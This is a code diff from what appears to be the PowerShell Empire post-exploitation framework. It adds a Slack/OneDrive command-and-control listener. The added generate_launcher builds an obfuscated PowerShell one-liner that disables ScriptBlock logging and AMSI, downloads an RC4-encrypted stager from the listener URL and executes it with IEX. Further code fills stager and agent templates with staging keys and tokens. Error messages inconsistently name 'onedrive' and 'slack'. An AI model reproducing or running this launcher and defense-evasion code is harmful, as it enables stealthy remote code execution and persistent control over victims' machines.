@@ -204,56 +204,208 @@ class Listener:
 
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+        if not language:
+            print helpers.color("[!] listeners/onedrive generate_launcher(): No language specified")
+
+        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
+            listener_options = self.mainMenu.listeners.activeListeners[listenerName]['options']
+            staging_key = listener_options['StagingKey']['Value']
+            profile = listener_options['DefaultProfile']['Value']
+            launcher_cmd = listener_options['Launcher']['Value']
+            staging_key = listener_options['StagingKey']['Value']
+            poll_interval = listener_options['PollInterval']['Value']
+            base_folder = listener_options['BaseFolder']['Value'].strip("/")
+            staging_folder = listener_options['StagingFolder']['Value']
+            taskings_folder = listener_options['TaskingsFolder']['Value']
+            results_folder = listener_options['ResultsFolder']['Value']
+
+            if language.startswith("power"):
+                launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
+
+                if safeChecks.lower() == 'true':
+                    launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
+                    # ScriptBlock Logging bypass
+                    launcher += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    launcher += "'System.Management.Automation.Utils'"
+                    launcher += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    launcher += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    launcher += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    launcher += "['ScriptB'+'lockLogging']"
+                    launcher += helpers.randomize_capitalization("){$GPC")
+                    launcher += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    launcher += helpers.randomize_capitalization("$GPC")
+                    launcher += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    launcher += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    launcher += "('EnableScriptB'+'lockLogging',0);"
+                    launcher += helpers.randomize_capitalization("$val.Add")
+                    launcher += "('EnableScriptBlockInvocationLogging',0);"
+                    launcher += helpers.randomize_capitalization("$GPC")
+                    launcher += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    launcher += helpers.randomize_capitalization("=$val}")
+                    launcher += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    launcher += "'signatures','N'+'onPublic,Static'"
+                    launcher += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+
+                    # @mattifestation's AMSI bypass
+                    launcher += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
+                    launcher += "'System.Management.Automation.AmsiUtils'"
+                    launcher += helpers.randomize_capitalization(');$Ref.GetField(')
+                    launcher += "'amsiInitFailed','NonPublic,Static'"
+                    launcher += helpers.randomize_capitalization(").SetValue($null,$true);")
+                    launcher += "};"
+                    launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
+
+                launcher += helpers.randomize_capitalization("$wc=New-Object SYstem.Net.WebClient;")
+
+                if userAgent.lower() == 'default':
+                    profile = listener_options['DefaultProfile']['Value']
+                    userAgent = profile.split("|")[1]
+                launcher += "$u='" + userAgent + "';"
+
+                if userAgent.lower() != 'none' or proxy.lower() != 'none':
+                    if userAgent.lower() != 'none':
+                        launcher += helpers.randomize_capitalization("$wc.Headers.Add(")
+                        launcher += "'User-Agent',$u);"
+
+                    if proxy.lower() != 'none':
+                        if proxy.lower() == 'default':
+                            launcher += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
+                        else:
+                            launcher += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
+                            launcher += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
+                            launcher += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
+                    if proxyCreds.lower() == "default":
+                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                    else:
+                        username = proxyCreds.split(":")[0]
+                        password = proxyCreds.split(":")[1]
+                        domain = username.split("\\")[0]
+                        usr = username.split("\\")[1]
+                        launcher += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+
+                    launcher += "$Script:Proxy = $wc.Proxy;"
+
+                # code to turn the key string into a byte array
+                launcher += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
+                launcher += ("'%s');" % staging_key)
+
+                # this is the minimized RC4 launcher code from rc4.ps1
+                launcher += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
+
+                launcher += helpers.randomize_capitalization("$data=$wc.DownloadData('")
+                launcher += self.mainMenu.listeners.activeListeners[listenerName]['stager_url']
+                launcher += helpers.randomize_capitalization("');$iv=$data[0..3];$data=$data[4..$data.length];")
+
+                launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
+
+                if obfuscate:
+                    launcher = helpers.obfuscate(self.mainMenu.installPath, launcher, obfuscationCommand=obfuscationCommand)
+
+                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
+                    return helpers.powershell_launcher(launcher, launcher_cmd)
+                else:
+                    return launcher
+
+            if language.startswith("pyth"):
+                print helpers.color("[!] listeners/slack generate_launcher(): Python agent not implimented yet")
+                return "python not implimented yet"
+
+        else:
+            print helpers.color("[!] listeners/slack generate_launcher(): invalid listener name")
+
+
+    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None, token=None):
         """
-        Generate a basic launcher for the specified listener.
+        Generate the stager code
         """
 
         if not language:
-            print helpers.color('[!] listeners/template generate_launcher(): no language specified!')
+            print helpers.color("[!] listeners/slack generate_stager(): no language specified")
             return None
 
-        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):
+        staging_key = listenerOptions['StagingKey']['Value']
+        base_folder = listenerOptions['BaseFolder']['Value']
+        staging_folder = listenerOptions['StagingFolder']['Value']
+        working_hours = listenerOptions['WorkingHours']['Value']
+        profile = listenerOptions['DefaultProfile']['Value']
+        agent_delay = listenerOptions['DefaultDelay']['Value']
 
-            # extract the set options for this instantiated listener
-            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
-            host = listenerOptions['Host']['Value']
-            stagingKey = listenerOptions['StagingKey']['Value']
-            profile = listenerOptions['DefaultProfile']['Value']
-            uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
-            stage0 = random.choice(uris)
-            launchURI = "%s/%s" % (host, stage0)
+        if language.lower() == 'powershell':
+            f = open("%s/data/agent/stagers/slack.ps1" % self.mainMenu.installPath)
+            stager = f.read()
+            f.close()
 
-            if language.startswith('po'):
-                # PowerShell
-                return ''
+            stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
+            stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
+            stager = stager.replace("REPLACE_TOKEN", token)
+            stager = stager.replace("REPLACE_POLLING_INTERVAL", str(agent_delay))
 
-            if language.startswith('py'):
-                # Python
-                return ''
+            if working_hours != "":
+                stager = stager.replace("REPLACE_WORKING_HOURS", working_hours)
 
+            randomized_stager = ''
+
+            for line in stager.split("\n"):
+                line = line.strip()
+
+                if not line.startswith("#"):
+                    if "\"" not in line:
+                        randomized_stager += helpers.randomize_capitalization(line)
+                    else:
+                        randomized_stager += line
+
+            if encode:
+                return helpers.enc_powershell(randomized_stager)
+            elif encrypt:
+                RC4IV = os.urandom(4)
+                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_stager)
             else:
-                print helpers.color("[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")
+                return randomized_stager
 
         else:
-            print helpers.color("[!] listeners/template generate_launcher(): invalid listener name specification!")
+            print helpers.color("[!] Python agent not available for Slack")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
+    def generate_agent(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
         """
-        If you want to support staging for the listener module, generate_stager must be
-        implemented to return the stage1 key-negotiation stager code.
+        Generate the agent code
         """
-        print helpers.color("[!] generate_stager() not implemented for listeners/template")
-        return ''
 
+        if not language:
+            print helpers.color("[!] listeners/slack generate_agent(): No language specified")
+            return
 
-    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
-        """
-        If you want to support staging for the listener module, generate_agent must be
-        implemented to return the actual staged agent code.
-        """
-        print helpers.color("[!] generate_agent() not implemented for listeners/template")
-        return ''
+        language = language.lower()
+        delay = listener_options['DefaultDelay']['Value']
+        jitter = listener_options['DefaultJitter']['Value']
+        profile = listener_options['DefaultProfile']['Value']
+        lost_limit = listener_options['DefaultLostLimit']['Value']
+        working_hours = listener_options['WorkingHours']['Value']
+        kill_date = listener_options['KillDate']['Value']
+        b64_default_response = base64.b64encode(self.default_response())
+
+        if language == 'powershell':
+            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
+            agent_code = f.read()
+            f.close()
+
+            comms_code = self.generate_comms(listener_options, client_id, token, refresh_token, redirect_uri, language)
+            agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
+
+            agent_code = helpers.strip_powershell_comments(agent_code)
+
+            agent_code = agent_code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
+            agent_code = agent_code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
+            agent_code = agent_code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            agent_code = agent_code.replace('$LostLimit = 60', "$LostLimit = " + str(lost_limit))
+            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response+'"')
+
+            if kill_date != "":
+                agent_code = agent_code.replace("$KillDate,", "$KillDate = '" + str(kill_date) + "',")
+
+            return agent_code
 
 
     def generate_comms(self, listenerOptions, language=None):
